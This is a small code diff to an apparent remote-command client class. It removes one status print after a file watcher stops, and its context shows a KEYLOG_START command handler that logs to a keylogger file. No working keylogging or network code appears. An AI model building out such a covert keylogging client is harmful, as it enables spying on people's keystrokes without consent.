@@ -485,7 +485,6 @@ class Client:
         elif command_type == CommandType.STOP_WATCH:
             print("Processing STOP_WATCH")
             self._stop_file_watcher()
-            print("    File watcher stopped.")
 
         elif command_type == CommandType.KEYLOG_START:
             log_file = "./keylogger.txt"
